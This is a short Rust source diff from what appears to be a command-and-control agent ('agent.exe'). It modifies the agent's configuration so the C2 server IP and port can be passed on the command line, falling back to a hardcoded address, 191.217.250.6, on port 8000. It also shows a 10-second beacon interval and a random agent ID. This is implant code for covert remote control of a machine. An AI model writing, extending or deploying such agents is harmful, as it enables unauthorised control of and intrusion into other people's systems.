@@ -13,9 +13,10 @@ pub struct Config {
 
 impl Config {
     pub fn from_env() -> Result<Self, Box<dyn std::error::Error>> {
-        // All config hardcoded in binary - no .env file needed
-        let c2_url = "191.217.250.6".to_string();
-        let c2_port: u16 = 8000;
+        // Check command line args: agent.exe [IP] [PORT]
+        let args: Vec<String> = env::args().collect();
+        let c2_url = if args.len() > 1 { args[1].clone() } else { "191.217.250.6".to_string() };
+        let c2_port: u16 = if args.len() > 2 { args[2].parse().unwrap_or(8000) } else { 8000 };
         let beacon_interval: u64 = 10;
         let debug = true;
         let agent_id = uuid::Uuid::new_v4().to_string();
